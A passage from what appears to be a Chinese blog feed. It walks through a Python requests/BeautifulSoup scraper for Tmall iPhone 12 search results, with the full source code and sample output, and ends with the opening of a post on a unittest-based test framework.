class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>另外，由于天猫中的图片采用了动态加载的机制，有一部分图片的连接，它的属性名称是 data-ks-lazyload，如下所示。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"productImg-wrap"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"productImg"</span> <span class="attr">data-p</span>=<span class="string">"6-10"</span> <span class="attr">href</span>=<span class="string">"//detail.tmall.com/item.htm?id=629312309341<span class="symbol">&amp;amp;</span>skuId=4644530586196<span class="symbol">&amp;amp;</span>user_id=1917047079<span class="symbol">&amp;amp;</span>cat_id=2<span class="symbol">&amp;amp;</span>is_b=1<span class="symbol">&amp;amp;</span>rn=3aad056cc7c20dee0b3ae5077500da27"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">data-ks-lazyload</span>=<span class="string">"//img.alicdn.com/bao/uploaded/i1/1917047079/O1CN01AVxqcg22AEPljUSlK_!!1917047079.png"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>获取图片链接的代码如下。 <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取商品图片标签对</span></span><br><span class="line">prod_img = product.find(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>:<span class="string">"productImg-wrap"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取img标签中的src属性值，即图片源地址</span></span><br><span class="line">img = prod_img.find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">img = prod_img.find(<span class="string">'img'</span>)[<span class="string">'data-ks-lazyload'</span>]  <span class="comment"># 采用了动态加载的机制</span></span><br><span class="line"><span class="comment"># Out[47]: </span></span><br><span class="line"><span class="string">'//img.alicdn.com/bao/uploaded/i2/1776456424/O1CN01CSDw9S1xKEzLfXldh_!!1776456424.jpg'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="获取商品价格">3.4.2. 获取商品价格</h3>
<ol type="1">
<li>展开 class=productPrice 的 div 标签，在 p 标签下，获取其中的文本或 title 属性值即可。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"productPrice"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span> <span class="attr">title</span>=<span class="string">"10099.00"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>¥<span class="tag">&lt;/<span class="name">b</span>&gt;</span>10099.00<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure> <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取商品价格标签对</span></span><br><span class="line">prod_price = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>:<span class="string">"productPrice"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取em标签中的title属性值，即商品价格</span></span><br><span class="line">price = prod_price.find(<span class="string">'em'</span>)[<span class="string">'title'</span>]</span><br><span class="line"><span class="comment"># Out[56]: </span></span><br><span class="line"><span class="string">'10099.00'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="获取商品全称">3.4.3. 获取商品全称</h3>
<ol type="1">
<li>展开 class=productTitle 的 div 标签，商品全称在 a 标签的文本中，也可通过 a 标签的 title 属性值获取。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"productTitle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//detail.tmall.com/item.htm?id=629630915729<span class="symbol">&amp;amp;</span>skuId=4743517782890<span class="symbol">&amp;amp;</span>user_id=2616970884<span class="symbol">&amp;amp;</span>cat_id=2<span class="symbol">&amp;amp;</span>is_b=1<span class="symbol">&amp;amp;</span>rn=d39717dee81702e88f1f7b3ac644ca14"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">title</span>=<span class="string">"【国家宝藏礼盒版选套餐一】Apple/苹果 iPhone 12 Pro Max移动联通电信全网通5G新品智能手机"</span> <span class="attr">data-p</span>=<span class="string">"4-11"</span> <span class="attr">atpanel</span>=<span class="string">"4-11,629630915729,1512,,spu,1,spu,2616970884,,,"</span>&gt;</span></span><br><span class="line">【国家宝藏礼盒版选套餐一】Apple/<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"H"</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"H"</span>&gt;</span>iPhone<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"H"</span>&gt;</span>12<span class="tag">&lt;/<span class="name">span</span>&gt;</span> Pro Max移动联通电信全网通5G新品智能手机</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure> <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取商品全称标签对</span></span><br><span class="line">prod_title = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>:<span class="string">"productTitle"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取a标签中的title属性值，即商品名称</span></span><br><span class="line">title = prod_title.find(<span class="string">'a'</span>)[<span class="string">'title'</span>]</span><br><span class="line"><span class="comment"># Out[60]:</span></span><br><span class="line"><span class="string">'【国家宝藏礼盒版选套餐一】Apple/苹果 iPhone 12 Pro Max移动联通电信全网通5G新品智能手机'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="获取商品所在店铺">3.4.4. 获取商品所在店铺</h3>
<ol type="1">
<li>展开 class=productShop 的 div 标签，店铺名称在 a 标签的文本中。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"productShop"</span> <span class="attr">data-atp</span>=<span class="string">"b!4-3,{user_id},,,,,,"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"productShop-name"</span> <span class="attr">href</span>=<span class="string">"//store.taobao.com/search.htm?user_number_id=2616970884<span class="symbol">&amp;amp;</span>rn=d39717dee81702e88f1f7b3ac644ca14<span class="symbol">&amp;amp;</span>keyword=iPhone12"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">atpanel</span>=<span class="string">"4-3,,,,spu,2,spu,"</span>&gt;</span></span><br><span class="line">苏宁易购官方旗舰店</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure> <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取商品所在店铺标签对</span></span><br><span class="line">prod_shop = product.find(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productShop"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取标签对中的文本内容，并去掉换行符'\n'</span></span><br><span class="line">shop = prod_shop.text.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># Out[67]: </span></span><br><span class="line"><span class="string">'苏宁易购官方旗舰店'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="获取商品月成交量和评价数量">3.4.5.
获取商品月成交量和评价数量</h3>
<blockquote>
<p>（视需求确定是否获取） 1.
展开 class=productStatus 的 div 标签，其中的前两个 span 子标签分别是月成交和评价，获取其中的元素文本内容即可。
</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"productStatus"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>月成交 <span class="tag">&lt;<span class="name">em</span>&gt;</span>753笔<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>评价 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//detail.tmall.com/item.htm?id=629630915729<span class="symbol">&amp;amp;</span>skuId=4743517782890<span class="symbol">&amp;amp;</span>user_id=2616970884<span class="symbol">&amp;amp;</span>cat_id=2<span class="symbol">&amp;amp;</span>is_b=1<span class="symbol">&amp;amp;</span>rn=d80f020d60ae6865c1f843a6cf738a49<span class="symbol">&amp;amp;</span>on_comment=1#J_TabBar"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-p</span>=<span class="string">"4-1"</span> <span class="attr">atpanel</span>=<span class="string">"4-1,629630915729,1512,,spu,1,spu,2616970884,,,"</span>&gt;</span>1676<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">data-icon</span>=<span class="string">"small"</span> <span class="attr">class</span>=<span class="string">"ww-light ww-small"</span> <span class="attr">data-item</span>=<span class="string">"629630915729"</span> <span class="attr">data-nick</span>=<span class="string">"苏宁易购官方旗舰店"</span> <span class="attr">data-tnick</span>=<span class="string">"苏宁易购官方旗舰店"</span> <span class="attr">data-display</span>=<span class="string">"inline"</span> <span class="attr">data-atp</span>=<span class="string">"a!4-2,,,,,,,2616970884"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://amos.alicdn.com/getcid.aw?v=3<span class="symbol">&amp;amp;</span>groupid=0<span class="symbol">&amp;amp;</span>s=1<span class="symbol">&amp;amp;</span>charset=utf-8<span class="symbol">&amp;amp;</span>uid=%E8%8B%8F%E5%AE%81%E6%98%93%E8%B4%AD%E5%AE%98%E6%96%B9%E6%97%97%E8%88%B0%E5%BA%97<span class="symbol">&amp;amp;</span>site=cntaobao<span class="symbol">&amp;amp;</span>fromid=cntaobaotb0553413_88"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">class</span>=<span class="string">"ww-inline ww-online"</span> <span class="attr">title</span>=<span class="string">"点此可以直接和卖家交流选好的宝贝，或相互交流网购体验，还支持语音视频噢。"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>旺旺在线<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure> <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 获取商品月成交量和评价数量的标签对</span></span><br><span class="line">prod_status = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>:<span class="string">"productStatus"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取标签对中的文本内容，并去掉换行符'\n'</span></span><br><span class="line">status = prod_status.text.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># Out[74]: </span></span><br><span class="line"><span class="string">'月成交 753笔评价 1676'</span></span><br></pre></td></tr></tbody></table></figure><p></p>
</blockquote>
<hr>
<h1 id="总体源码">4. 总体源码</h1>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">"""=================================================</span></span><br><span class="line"><span class="string">@Author : FantasyBoyce</span></span><br><span class="line"><span class="string">@Date   : 2021/03/07 13:12</span></span><br><span class="line"><span class="string">@Desc   :</span></span><br><span class="line"><span class="string">=================================================="""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> my_fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Product</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="variable language_">self</span>.product_info = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_headers</span>(<span class="params">self</span>):</span><br><span class="line">        ua = UserAgent()</span><br><span class="line">        headers = {</span><br><span class="line">            <span class="string">"accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,"</span></span><br><span class="line">                      <span class="string">"*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">            <span class="string">"accept-encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</span><br><span class="line">            <span class="string">"accept-language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">            <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span><br><span class="line">            <span class="string">"pragma"</span>: <span class="string">"no-cache"</span>,</span><br><span class="line">            <span class="string">"sec-fetch-dest"</span>: <span class="string">"document"</span>,</span><br><span class="line">            <span class="string">"sec-fetch-mode"</span>: <span class="string">"navigate"</span>,</span><br><span class="line">            <span class="string">"sec-fetch-site"</span>: <span class="string">"none"</span>,</span><br><span class="line">            <span class="string">"sec-fetch-user"</span>: <span class="string">"?1"</span>,</span><br><span class="line">            <span class="string">"upgrade-insecure-requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"user-agent"</span>: ua.random()</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> headers</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_product_list</span>(<span class="params">self, url</span>):</span><br><span class="line">        search_url = url</span><br><span class="line">        rsp = <span class="variable language_">self</span>.session.get(search_url, headers=<span class="variable language_">self</span>.get_headers())</span><br><span class="line">        </span><br><span class="line">        soup = BeautifulSoup(rsp.content, <span class="string">'lxml'</span>, from_encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == rsp.status_code:</span><br><span class="line">            product_list = soup.find_all(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>: <span class="string">"product"</span>})</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"商品查询成功, 当前获取商品数量: <span class="subst">{<span class="built_in">len</span>(product_list)}</span>个."</span>)</span><br><span class="line">            <span class="keyword">return</span> product_list</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"商品查询可能出错，的返回状态：<span class="subst">{rsp.status_code}</span>"</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_product_info</span>(<span class="params">self, product</span>):</span><br><span class="line">        <span class="comment"># 获取商品图片标签对</span></span><br><span class="line">        prod_img = product.find(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productImg-wrap"</span>})</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取img标签中的src属性值，即图片源地址</span></span><br><span class="line">            img = prod_img.find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            img = prod_img.find(<span class="string">'img'</span>)[<span class="string">'data-ks-lazyload'</span>]  <span class="comment"># 采用了动态加载的机制</span></span><br><span class="line">            <span class="comment"># img = f"Can't get img link, {e}"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取商品价格标签对</span></span><br><span class="line">            prod_price = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productPrice"</span>})</span><br><span class="line">            <span class="comment"># 获取em标签中的title属性值，即商品价格</span></span><br><span class="line">            price = prod_price.find(<span class="string">'em'</span>)[<span class="string">'title'</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            price = <span class="string">f"Can't get price info, <span class="subst">{e}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取商品全称标签对</span></span><br><span class="line">            prod_title = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productTitle"</span>})</span><br><span class="line">            <span class="comment"># 获取a标签中的title属性值，即商品名称</span></span><br><span class="line">            title = prod_title.find(<span class="string">'a'</span>)[<span class="string">'title'</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            title = <span class="string">f"Can't get title info, <span class="subst">{e}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取商品所在店铺标签对</span></span><br><span class="line">            prod_shop = product.find(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productShop"</span>})</span><br><span class="line">            <span class="comment"># 获取标签对中的文本内容，并去掉换行符'\n'</span></span><br><span class="line">            shop = prod_shop.text.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shop = <span class="string">f"Can't get shop info, <span class="subst">{e}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取商品月成交量和评价数量的标签对</span></span><br><span class="line">            prod_rates = product.find(name=<span class="string">'p'</span>, attrs={<span class="string">"class"</span>: <span class="string">"productStatus"</span>})</span><br><span class="line">            <span class="comment"># 获取标签对中的文本内容，并去掉换行符'\n'</span></span><br><span class="line">            rates = prod_rates.text.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            rates = <span class="string">f"Can't get rates info, <span class="subst">{e}</span>"</span></span><br><span class="line">        </span><br><span class="line">        res = (title, price, shop, img, rates)</span><br><span class="line">        <span class="variable language_">self</span>.product_info.append(res)</span><br><span class="line">        <span class="comment"># 清除本次会话的缓存</span></span><br><span class="line">        <span class="variable language_">self</span>.session.cookies.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    keyword = <span class="string">'iPhone12'</span></span><br><span class="line">    base_url = <span class="string">'https://list.tmall.com/search_product.htm'</span></span><br><span class="line">    </span><br><span class="line">    my_product = Product()</span><br><span class="line">    </span><br><span class="line">    page_url = <span class="string">f"<span class="subst">{base_url}</span>?q=<span class="subst">{keyword}</span>"</span></span><br><span class="line">    iPhone12_list = my_product.get_product_list(page_url)</span><br><span class="line">    <span class="keyword">for</span> iphone <span class="keyword">in</span> iPhone12_list:</span><br><span class="line">        my_product.get_product_info(iphone)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> my_product.product_info:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h1 id="输出结果展示">5. 输出结果展示</h1>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">商品查询成功,</span> <span class="string">当前获取商品数量:</span> <span class="number">60</span><span class="string">个.</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span><span class="string">', '</span><span class="number">6799.00</span><span class="string">', '</span><span class="string">Apple</span> <span class="string">Store</span> <span class="string">官方旗舰店',</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/1917047079/O1CN01fj74HM22AEPevWxeV_!!1917047079.png'</span><span class="string">,</span> <span class="string">"Can't get rates info, 'NoneType' object has no attribute 'text'"</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">Pro</span> <span class="string">Max',</span> <span class="string">'10099.00'</span><span class="string">,</span> <span class="string">'Apple Store 官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/1917047079/O1CN01hWlbn622AEPevS3ps_!!1917047079.png'</span><span class="string">,</span> <span class="string">"Can't get rates info, 'NoneType' object has no attribute 'text'"</span><span class="string">)</span></span><br><span class="line"><span class="string">('【优惠610元华创</span>  <span class="string">中国移动官旗】苹果</span> <span class="number">12</span><span class="string">手机iPhone</span> <span class="number">12</span><span class="string">苹果手机移动官方旗舰店iPhone手机国行iPhone</span> <span class="number">12</span><span class="string">手机',</span> <span class="string">'6799.00'</span><span class="string">,</span> <span class="string">'中国移动官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/1776456424/O1CN01XdPKZJ1xKEzmGU468_!!1776456424.jpg'</span><span class="string">,</span> <span class="string">'月成交 6237笔评价 1.1万'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【至高优惠610元+抢先收藏加购！】Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">5G手机官网旗舰iphone12</span> <span class="string">苹果12官方旗舰正品',</span> <span class="string">'6799.00'</span><span class="string">,</span> <span class="string">'中国移动手机官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i3/713805254/O1CN01Y5mBIm1ogNbAVrAEG_!!713805254.jpg'</span><span class="string">,</span> <span class="string">'月成交 3280笔评价 4900'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【国家宝藏礼盒版选套餐一】Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">Pro</span> <span class="string">Max移动联通电信全网通5G新品智能手机iPhone12promax',</span> <span class="string">'10099.00'</span><span class="string">,</span> <span class="string">'苏宁易购官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/2616970884/O1CN01sO6WRY1IOunAkj5A3_!!2616970884.jpg'</span><span class="string">,</span> <span class="string">'月成交 710笔评价 1827'</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">Pro',</span> <span class="string">'9299.00'</span><span class="string">,</span> <span class="string">'Apple Store 官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i1/1917047079/O1CN01AVxqcg22AEPljUSlK_!!1917047079.png'</span><span class="string">,</span> <span class="string">"Can't get rates info, 'NoneType' object has no attribute 'text'"</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">mini',</span> <span class="string">'5999.00'</span><span class="string">,</span> <span class="string">'Apple Store 官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i4/1917047079/O1CN01QAYmao22AEPhVXYiV_!!1917047079.png'</span><span class="string">,</span> <span class="string">"Can't get rates info, 'NoneType' object has no attribute 'text'"</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">全网通5G新品智能手机苏宁易购官方旗舰正品苹果12',</span> <span class="string">'6299.00'</span><span class="string">,</span> <span class="string">'苏宁易购官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/2616970884/O1CN01RlrIPF1IOun5DgTps_!!2616970884.jpg'</span><span class="string">,</span> <span class="string">'月成交 1498笔评价 1.6万'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【至高优惠600元/抢先收藏加购】苹果12</span> <span class="string">ProMax手机iPhone</span> <span class="string">12ProMax苹果官方旗舰店苹果手机12promax',</span> <span class="string">'9299.00'</span><span class="string">,</span> <span class="string">'中国移动手机官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/713805254/O1CN01rgwfXx1ogNbELTgpN_!!713805254.jpg'</span><span class="string">,</span> <span class="string">'月成交 1430笔评价 2049'</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">手机国行正品5G</span> <span class="string">双卡双待全国联保',</span> <span class="string">'6799.00'</span><span class="string">,</span> <span class="string">'天猫超市'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i4/73/O1CN01rXg9Xz1CPTa5XrLze_!!73-0-lubanu.jpg'</span><span class="string">,</span> <span class="string">'月成交 5978笔评价 4034'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【至高优惠600元+快充头/抢先加购】苹果12</span> <span class="string">Pro手机iPhone</span> <span class="number">12</span> <span class="string">Pro苹果手机移动官方旗舰正品5G版',</span> <span class="string">'8499.00'</span><span class="string">,</span> <span class="string">'中国移动手机官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i1/713805254/O1CN01QCuVPh1ogNbCrc462_!!713805254.jpg'</span><span class="string">,</span> <span class="string">'月成交 1089笔评价 2066'</span><span class="string">)</span></span><br><span class="line"><span class="string">('Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">mini</span> <span class="string">移动联通电信全网通5G新品智能手机',</span> <span class="string">'5999.00'</span><span class="string">,</span> <span class="string">'苏宁易购官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i4/2616970884/O1CN010AUJkR1IOunAkgWy5_!!2616970884.jpg'</span><span class="string">,</span> <span class="string">'月成交 875笔评价 1609'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【国家宝藏礼盒版选套餐一】Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span> <span class="string">Pro</span> <span class="string">全网通5G新品手机',</span> <span class="string">'9299.00'</span><span class="string">,</span> <span class="string">'苏宁易购官方旗舰店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i4/2616970884/O1CN01QNcryZ1IOun5juKpy_!!2616970884.jpg'</span><span class="string">,</span> <span class="string">'月成交 754笔评价 512'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【24期分期免息】蜜茶手机苹果12</span> <span class="string">Apple/苹果</span> <span class="string">iPhone</span> <span class="number">12</span><span class="string">全网通5G手机国行官方正品苹果12手机</span> <span class="string">iPhone12手机',</span> <span class="string">'7548.00'</span><span class="string">,</span> <span class="string">'搜酷数码专营店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i2/2124156138/O1CN019pRcNP1vDFipclZBW_!!2124156138.jpg'</span><span class="string">,</span> <span class="string">'月成交 1123笔评价 545'</span><span class="string">)</span></span><br><span class="line"><span class="string">('【全新正品</span> <span class="string">直降400元</span> <span class="string">】</span> <span class="string">苹果iPhone12</span> <span class="string">全网通5G手机</span> <span class="string">苹果12</span> <span class="string">mini新品</span> <span class="string">国行Apple</span> <span class="string">iphone</span> <span class="number">12</span><span class="string">迷你期官方分期',</span> <span class="string">'6499.00'</span><span class="string">,</span> <span class="string">'友欣数码专营店'</span><span class="string">,</span> <span class="string">'//img.alicdn.com/bao/uploaded/i1/1719489463/O1CN01UHsWIZ2Jm6cvqvyHQ_!!0-item_pic.jpg'</span><span class="string">,</span> <span class="string">'月成交 1561笔评价 1766'</span><span class="string">)</span></span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>requests</tag>
        <tag>BeautifulSoup</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 unittest 模块设计自动化测试框架</title>
    <url>/p/ff686ad5.html</url>
    <content><![CDATA[<h1 id="运行环境">1. 运行环境</h1>
<table>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Python</td>
<td>3.7 以上</td>
</tr>
<tr class="even">
<td> 2</td>
<td>IDE</td>
<td> 集成开发环境，Pycharm、Eclipse 等</td>
</tr>
<tr class="odd">
<td> 3</td>
<td> 操作系统</td>
<td> Windows/MacOS/Linux 均可</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<hr>
<h1 id="框架构思">2. 框架构思</h1>
<p>  经过短暂的构思，初步定型的框架如下图所示，各个组件的设计及用途，将在 <a href="#3-1-组件设计">3.1. 组件设计</a>章节进行详细阐述。 <img src="/p/ff686ad5/Framework_mind_map.webp" alt="测试框架导图"> <!---![组件关系图]()---></p>
<hr>
<h1 id="代码实现">3. 代码实现</h1>
<h2 id="组件设计">3.1. 组件设计</h2>
<h3 id="common组件">3.1.1. common 组件</h3>
